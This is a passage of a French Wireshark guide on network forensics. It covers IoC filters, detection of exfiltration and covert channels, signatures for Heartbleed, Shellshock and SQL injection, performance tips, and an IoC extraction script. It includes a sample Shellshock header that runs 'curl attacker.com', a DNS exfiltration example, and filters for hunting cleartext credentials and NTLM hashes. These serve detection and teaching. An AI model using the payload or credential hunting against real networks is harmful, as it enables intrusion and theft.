+ip.addr == 104.244.42.1           # Exemple IP malveillante connue
+
+# Chercher connexions vers IPs géographiquement suspectes
+```
+
+**Domaines malveillants**
+```
+dns.qry.name contains "evil.com"
+dns.qry.name contains "c2server"
+dns.qry.name contains "duckdns"
+dns.qry.name contains "no-ip"
+
+# DGA (Domain Generation Algorithm)
+dns.qry.name matches "^[a-z]{20,}\\.com$"  # Domaines aléatoires longs
+```
+
+**File Hashes**
+```
+1. Extraire les fichiers : File > Export Objects > HTTP/SMB
+2. Calculer hash : sha256sum fichier.exe
+3. Vérifier sur VirusTotal
+```
+
+### Exfiltration Detection
+
+**Grands uploads**
+```
+http.request.method == "POST" && tcp.len > 1000
+tcp.srcport == 80 && tcp.len > 1400  # Upload sur HTTP
+
+Statistics > Conversations > TCP
+Trier par "Bytes A → B"
+→ Volumes anormalement élevés = exfiltration potentielle
+```
+
+**DNS Exfiltration**
+```
+dns.qry.name.len > 50
+dns.qry.name matches "^[a-f0-9]{32,}\\."
+
+Exemple :
+68656c6c6f776f726c64.attacker.com
+→ Décoder hex : "helloworld"
+```
+
+**ICMP Tunneling**
+```
+icmp && data.len > 0
+
+Right-click > Follow > UDP Stream
+Chercher des données dans payload ICMP
+```
+
+---
+
+## 1️⃣7️⃣ Techniques Anti-Forensique
+
+### Détecter l'évasion
+
+**Fragmentation IP**
+```
+ip.flags.mf == 1                  # More Fragments flag
+ip.frag_offset > 0                # Fragments offset
+```
+
+**Fragmentation utilisée pour évasion**
+```
+- Bypass de firewall/IDS
+- Cacher des payloads malveillants
+- Polymorphisme de paquets
+```
+
+**Reassembly**
+```
+Wireshark reassemble automatiquement
+Edit > Preferences > Protocols > IPv4
+☑ Reassemble fragmented IPv4 datagrams
+```
+
+### TTL Manipulation
+
+**Détection de spoofing**
+```
+ip.ttl < 10                       # TTL anormalement bas
+ip.ttl > 200                      # TTL anormalement haut
+
+# Comparer avec baseline normale
+Statistics > IPv4 Statistics > All Addresses
+```
+
+**TTL inconsistant = spoofing**
+```
+Même source IP avec TTL différents dans conversation
+→ Indicateur de spoofing ou proxy
+```
+
+### Covert Channels
+
+**Dans ICMP**
+```
+icmp.type == 8 && data.len > 0    # Echo request avec données
+
+Analyser le payload :
+- Données répétitives = normal
+- Données aléatoires = potentiel covert channel
+```
+
+**Dans TCP Options**
+```
+tcp.options
+
+Chercher :
+- Options non standard
+- Données cachées dans padding
+- Timestamps manipulés
+```
+
+**Dans TTL/IP ID**
+```
+# Données encodées dans IP ID
+ip.id
+
+# Patterns anormaux
+Statistics > I/O Graph
+Y-axis : MAX(ip.id)
+→ Progression linéaire = normal
+→ Sauts importants = suspect
+```
+
+---
+
+## 1️⃣8️⃣ Exploitation de Vulnérabilités Détectables
+
+### Heartbleed (CVE-2014-0160)
+
+**Détection**
+```
+ssl.heartbeat_message
+
+Chercher :
+1. Heartbeat Request avec payload > 0
+2. Heartbeat Response avec données sensibles
+```
+
+**Analyse**
+```
+Follow TLS Stream
+Heartbeat Response contenant :
+- Memory dumps
+- Private keys
+- Session cookies
+- Passwords
+```
+
+### EternalBlue (MS17-010)
+
+**Détection SMB vulnérable**
+```
+smb.native_os contains "Windows 5"    # Windows XP/2003/2008
+smb2.dialect == 0x0202                # SMBv1
+
+# Packets d'exploit
+smb2.cmd == 0  # Negotiate
+→ Vérifier la réponse du serveur
+```
+
+### Shellshock (CVE-2014-6271)
+
+**Détection dans HTTP**
+```
+http.user_agent contains "() {"
+http.user_agent contains "; /bin/bash"
+
+Exemple :
+User-Agent: () { :; }; /bin/bash -c "curl attacker.com"
+```
+
+### SQL Injection Successful
+
+**Indicators de succès**
+```
+http contains "mysql_fetch_array"
+http contains "Warning: mysql"
+http contains "SQL syntax"
+http contains "ORA-01"
+http contains "PostgreSQL"
+
+# Time-based
+http2.time > 5                        # Réponse anormalement lente
+```
+
+**Extraction de données**
+```
+http.request.uri contains "UNION SELECT"
+
+Follow HTTP Stream
+→ Chercher les données extraites dans la réponse
+```
+
+---
+
+## 1️⃣9️⃣ Optimisation et Performance
+
+### Réduire la taille des captures
+
+**Filtres de capture intelligents**
+```
+# Exclure le broadcast/multicast inutile
+not broadcast and not multicast
+
+# Capturer uniquement HTTP/HTTPS
+tcp port 80 or tcp port 443
+
+# Exclure SSH de votre admin
+not (tcp port 22 and host 192.168.1.50)
+
+# Capturer uniquement les nouveaux flux
+tcp[tcpflags] & tcp-syn != 0
+```
+
+**Limiter la taille des paquets (Snaplen)**
+```
+Capture > Options > Limit each packet to X bytes
+
+Recommandations :
+- Headers seulement : 68 bytes
+- HTTP/DNS : 128 bytes
+- Analyse complète : 1500 bytes (MTU)
+- Full capture : 65535 bytes
+```
+
+### Rotation des fichiers
+
+```
+Capture > Options > Output
+
+☑ Create a new file automatically
+- After X megabytes : 100 MB
+- After X files : 10
+→ Garde les 10 derniers fichiers de 100MB chacun
+```
+
+### Améliorer les performances
+
+**Désactiver les résolutions**
+```
+Edit > Preferences > Name Resolution
+☐ Resolve MAC addresses
+☐ Resolve transport names
+☐ Resolve network addresses
+
+Ou lancer avec : wireshark -n -N m
+```
+
+**Augmenter le buffer**
+```
+Capture > Options > [Interface] > Buffer size
+Recommandé : 100 MB - 500 MB
+
+Ou ligne de commande : -B 100
+```
+
+---
+
+## 2️⃣0️⃣ Profiles et Configurations
+
+### Créer des profiles personnalisés
+
+```
+Edit > Configuration Profiles > New
+
+Profiles recommandés :
+1. Web Pentest
+   - Filtres HTTP/TLS
+   - Colonnes : Host, Method, Status
+   - Coloration : POST en jaune
+
+2. Network Forensics
+   - Colonnes : Stream, TTL, Flags
+   - Filtres malware IoCs
+   - Coloration : Anomalies en rouge
+
+3. Credentials Hunting
+   - Filtres : ftp, telnet, http.authorization
+   - Colonnes : Protocol, Auth method
+   - Coloration : Protocols non-chiffrés
+
+4. DNS Analysis
+   - Colonnes : Query, Response, Type
+   - Filtres : Tunneling, Amplification
+   - Coloration : Requêtes longues
+```
+
+### Export de configurations
+
+```
+Edit > Preferences > Appearance > Layout
+Export current profile : [Profile Name]
+
+Fichiers générés :
+- preferences
+- recent
+- dfilter_buttons
+- dfilter_macros
+```
+
+---
+
+## 2️⃣1️⃣ Commandes et Astuces Rapides
+
+### Raccourcis essentiels
+
+```
+Ctrl + E    : Démarrer/Arrêter capture
+Ctrl + K    : Options de capture
+Ctrl + F    : Find packet
+Ctrl + G    : Go to packet
+Ctrl + /    : Filtrer conversation sélectionnée
+Ctrl + Alt + Shift + T : Follow TCP Stream
+Ctrl + →   : Paquet suivant dans conversation
+Ctrl + ←   : Paquet précédent dans conversation
+```
+
+### Find Packet avancé
+
+```
+Edit > Find Packet (Ctrl+F)
+
+Types de recherche :
+1. Display filter
+2. Hex value
+3. String (case sensitive/insensitive)
+4. Regular Expression
+
+Exemples :
+- String : "password" (in Packet Bytes)
+- Hex : 504f5354 (POST en ASCII)
+- Regex : flag\{[a-z0-9_]+\}
+```
+
+### Bookmarks
+
+```
+Right-click > Set/Unset Time Reference
+Ctrl + T : Toggle time reference
+
+Utilité :
+- Marquer le début d'une attaque
+- Calculer la durée d'événements
+- Timeline forensique
+```
+
+### Expert Info
+
+```
+Analyze > Expert Information
+
+Catégories :
+- Errors (Rouge) : Malformations, erreurs graves
+- Warnings (Jaune) : Retransmissions, resets
+- Notes (Cyan) : Informations diverses
+- Chats (Bleu) : Conversations normales
+
+Utiliser pour détecter rapidement les problèmes
+```
+
+---
+
+## 2️⃣2️⃣ Intégration avec Autres Outils
+
+### Avec Nmap
+
+```
+# Capturer pendant un scan Nmap
+1. Démarrer Wireshark sur l'interface
+2. Lancer Nmap : nmap -sS -p- 192.168.1.1
+3. Analyser les paquets pour comprendre le scan
+4. Comparer avec les résultats Nmap
+```
+
+### Avec Metasploit
+
+```
+# Analyser une exploitation
+1. Capturer pendant l'utilisation d'exploit
+2. Identifier :
+   - Payload delivery
+   - Shell reverse/bind
+   - Post-exploitation traffic
+   - Persistence mechanisms
+```
+
+### Avec Burp Suite
+
+```
+# Exporter trafic Burp vers PCAP
+1. Burp : Proxy > Options > Edit interface
+2. ☑ Support invisible proxying
+3. Capturer avec Wireshark sur l'interface loopback
+4. Analyser le trafic manipulé par Burp
+```
+
+### Avec CyberChef
+
+```
+# Workflow typique
+1. Wireshark : Extraire données hex (Copy > Bytes as Hex Stream)
+2. CyberChef : Coller dans Input
+3. Appliquer recette :
+   - From Hex
+   - Decrypt (AES/DES/RSA)
+   - Decompress (gzip/zlib)
+   - Decode (Base64/URL)
+4. Analyser le résultat
+```
+
+---
+
+## 2️⃣3️⃣ Labs et Exercices Pratiques
+
+### Captures d'entraînement
+
+**Sources recommandées**
+```
+1. Malware-Traffic-Analysis.net
+   - PCAP de malware réels
+   - Exercices avec solutions
+   - Patterns C2, ransomware, etc.
+
+2. Wireshark Sample Captures
+   https://wiki.wireshark.org/SampleCaptures
+   - Tous types de protocoles
+   - Attaques documentées
+
+3. PacketLife.net
+   - Captures réseaux
+   - Configurations Cisco
+
+4. CTF PCAP Archives
+   - github.com/markofu/pcaps
+   - CTFtime.org (tag: forensics)
+```
+
+### Exercices de compétence
+
+**Niveau Débutant**
+```
+1. Extraire credentials FTP d'une capture
+2. Identifier les IPs communiquant
+3. Trouver les domaines DNS requis
+4. Extraire des fichiers HTTP
+5. Identifier le protocole majoritaire
+```
+
+**Niveau Intermédiaire**
+```
+1. Décrypter du HTTPS avec SSLKEYLOGFILE
+2. Détecter un scan de ports
+3. Identifier un DNS tunneling
+4. Extraire des hashes NTLM
+5. Reconstruire une conversation SMB
+```
+
+**Niveau Avancé**
+```
+1. Identifier un ARP spoofing attack
+2. Analyser un malware C2 beacon
+3. Décrypter un protocole custom
+4. Détecter une exfiltration DNS
+5. Timeline complète d'une APT attack
+```
+
+---
+
+## 2️⃣4️⃣ Checklist Analyse Rapide
+
+### Workflow standard d'analyse
+
+```
+☑ 1. Vue d'ensemble
+   - Statistics > Protocol Hierarchy
+   - Statistics > Conversations
+   - Statistics > Endpoints
+   - Identifier les protocoles inhabituels
+
+☑ 2. Recherche de credentials
+   http.authorization
+   ftp
+   telnet
+   ntlmssp
+   http contains "password"
+
+☑ 3. Détection d'anomalies
+   tcp.analysis.retransmission
+   dns.qry.name.len > 50
+   tcp.flags.syn == 1 && tcp.flags.ack == 0
+   arp.duplicate-address-detected
+
+☑ 4. Analyse de sécurité TLS
+   tls.handshake.ciphersuite (cipher suites faibles)
+   tls.handshake.version (versions obsolètes)
+   tls.handshake.certificate (certificats auto-signés)
+
+☑ 5. Extraction de données
+   File > Export Objects > HTTP/SMB
+   Follow TCP Stream
+   Extraire les credentials
+
+☑ 6. IoCs (Indicators of Compromise)
+   IPs suspectes
+   Domaines malveillants
+   User-Agents anormaux
+   Fichiers téléchargés
+
+☑ 7. Timeline
+   Trier par temps
+   Identifier l'infection initiale
+   Tracer la progression de l'attaque
+   Documenter les événements clés
+```
+
+---
+
+## 2️⃣5️⃣ Ressources et Documentation
+
+### Documentation officielle
+```
+- Wireshark User's Guide : https://www.wireshark.org/docs/wsug_html_chunked/
+- Display Filters Reference : https://www.wireshark.org/docs/dfref/
+- Wiki Wireshark : https://wiki.wireshark.org/
+- Protocol Reference : https://www.wireshark.org/docs/dfref/
+```
+
+### Communautés
+```
+- Ask Wireshark : https://ask.wireshark.org/
+- Reddit : r/Wireshark
+- Stack Overflow : [wireshark] tag
+- Discord : Wireshark Community Server
+```
+
+### Formations et Certifications
+```
+- Wireshark Certified Network Analyst (WCNA)
+- SANS FOR572: Advanced Network Forensics
+- eLearnSecurity Network Defense Professional
+- Pluralsight: Wireshark courses
+- Udemy: Wireshark Network Analysis
+```
+
+### Livres recommandés
+```
+1. "Practical Packet Analysis" - Chris Sanders
+   - Best seller, approche pratique
+   - Exercices réels
+
+2. "Wireshark Network Analysis" - Laura Chappell
+   - Guide complet et détaillé
+   - Reference pour professionnels
+
+3. "Network Forensics" - Sherri Davidoff & Jonathan Ham
+   - Focus forensique
+   - Cas d'utilisation réels
+
+4. "Wireshark for Security Professionals" - Jessey Bullock
+   - Orienté sécurité offensive
+   - Techniques d'exploitation
+```
+
+---
+
+## 💡 Tips Finaux de Pro
+
+### Best Practices
+
+1. **Toujours désactiver la résolution DNS** pendant captures live (View > Name Resolution)
+2. **Utiliser des filtres de capture** pour réduire le bruit dès le départ
+3. **Sauvegarder vos filtres display favoris** (bouton bookmark à droite)
+4. **Créer des profils personnalisés** pour différents types d'analyses
+5. **Utiliser les couleurs** pour repérer rapidement les anomalies
+6. **Follow streams** pour comprendre le contexte complet
+7. **Statistics > I/O Graph** pour visualiser les patterns temporels
+8. **Expert Info** pour détecter rapidement les problèmes
+9. **Combiner avec d'autres outils** (Nmap, Burp, CyberChef)
+10. **Documenter vos trouvailles** avec bookmarks et commentaires
+
+### Automatisation avec Scripts
+
+**Export automatique d'IoCs**
+```bash
+#!/bin/bash
+# extract_iocs.sh - Extraire IoCs d'un PCAP
+
+PCAP=$1
+
+echo "[+] Extracting IoCs from $PCAP"
+
+echo "
+[*] DNS Queries:"
+tshark -r "$PCAP" -Y "dns.qry.name" -T fields -e dns.qry.name | sort -u > dns_queries.txt
+
+echo "[*] HTTP Hosts:"
+tshark -r "$PCAP" -Y "http.host" -T fields -e http.host | sort -u > http_hosts.txt
+
+echo "[*] IP Conversations:"
+tshark -r "$PCAP" -q -z conv,ip | grep "<->" > ip_conversations.txt
+
+echo "[*] Downloaded Files:"
+tshark -r "$PCAP" --export-objects http,exported_files/
+
+echo "[+] Done! Check generated files."
+```
+
+### Méthode d'Analyse Structurée
+
+```
+1. RECONNAISSANCE (5 min)
+   - Protocol Hierarchy
+   - Conversations
+   - Endpoints
+   → Comprendre le trafic global
+
+2. IDENTIFICATION (10 min)
+   - Credentials en clair
+   - Protocols non chiffrés
+   - Certificats suspects
+   → Trouver les low-hanging fruits
+
+3. ANALYSE APPROFONDIE (20 min)
+   - Anomalies réseau
+   - Patterns suspects
+   - Exfiltration potentielle
+   → Creuser dans les détails
+
+4. EXTRACTION (10 min)
+   - Fichiers
+   - Credentials
+   - IoCs
+   → Collecter les preuves
+
+5. DOCUMENTATION (15 min)
+   - Timeline
+   - IoCs
+   - Recommandations
+   → Rapport d'analyse
+```
+
+---
+
+## 🎯 Conclusion
+
+**Wireshark est l'outil le plus puissant pour :**
+- ✅ Analyser le trafic réseau en profondeur
+- ✅ Détecter des attaques en temps réel
+- ✅ Extraire des credentials et données sensibles
+- ✅ Décrypter du trafic chiffré (avec les bonnes clés)
+- ✅ Faire de la forensique d'incidents
+- ✅ Comprendre les protocoles réseau
+- ✅ Identifier des malwares et C2
+- ✅ Reverse engineer des protocoles customs
+
+**Maîtrisez Wireshark et vous verrez TOUT ce qui se passe sur le réseau ! 🦈**
+
+---
+
+**Version** : 2.0
+**Dernière mise à jour** : Décembre 2024
+**Auteur** : Guide Cyber Sécurité
